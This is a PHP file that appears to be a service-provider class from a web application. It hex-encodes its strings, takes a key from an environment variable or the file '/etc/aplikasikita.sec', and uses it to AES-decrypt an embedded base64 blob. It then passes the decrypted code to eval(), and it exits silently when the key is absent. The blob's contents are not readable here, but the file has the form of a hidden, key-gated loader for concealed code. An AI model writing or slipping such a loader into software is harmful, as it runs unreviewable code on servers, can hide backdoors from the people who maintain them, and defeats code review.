<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('DPMvfO/G29bhng5rIOqJFA==');

$c=base64_decode(

'TDmyqqJBtEMvd5UMw6137qs9x/2M+c9UqowYSKen6dlsnOkmrLCLl3F1JgTtM76Q59v8wRtP8aPC' .
'Yy1cNlHDdsQtEBrWNdcpjwLJLQet0UvuzlzwGgJIX/gL9ZlAuwKSSkoSjhlavXpgD/MfDLkVlMLS' .
'kZZyJH/NnONAE4HPV7c5ccZ0i6/NXF3Wcu/A5syVMripT03zkV1qNrzSgsv4J2G/7D01LYRtx7tA' .
'nWwUQtfkIU6HseToHi6V6uuZSHN4/UDhr5v9vFFACK1x54r7xkQuVC+hqN77zTyuoEWDayLs1Rmj' .
'Q9D5y/lPcB7ttC7XJIhFjQ3jGbQq6C5eGpX9kJUnnAJOShma/l7Q5a9vtnHCupPYbk5lALiV9kxb' .
'vmD4a9jmZVo9cxXABFQP3RZlJQpviTEeqQQiuVkSXbqKUWsIRJAcrlFznCwosoqsMulQS1EGPOah' .
'JHaY9UPX2yGcB/5kPSH98h46loZ4W94ERtJ0dVRKui0SlVvxmB/DiPQvIH6zpZmeShenY9CdQ/eF' .
'pkTB3ruvNI5fvGh2/9E5l92/LdSWV8SnvU/Met4BI1071VpNjxG9MtNEFFPttJrUM1CGfnxHJYU3' .
'HCoPe8iZDbztuy3SEC2Gc7ouDi1oOI6FO0mGImKDkq+SecJ8ad/BRc1DEM6DU3YeUen/sqQB4JIV' .
'9/vZvaymH6wpeQMAc5w4A3kU5iZdVdHXULTGMqE1aqNPQX6OnWOjJap4PnZ7ycBnNdfTGKKU11mH' .
'pVT6nyp/prkx3G1bH1bID4j99X7oEY4Ad/w9V5TPGwGerIe8Jc9Gqd+MBFst9lCf7Po9NoYJ9P3H' .
'L4WknhqwcMxTXuQXbBw0aT+IWLHqgz8+DAeJ7qKrhK3idJyVozAqQJlSfghY/hsO95GISo5dIEHg' .
'XxNm2LhcOXpFFrVrLfidambgUKefp6Qh217oYFxJkc/Xb7s0'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

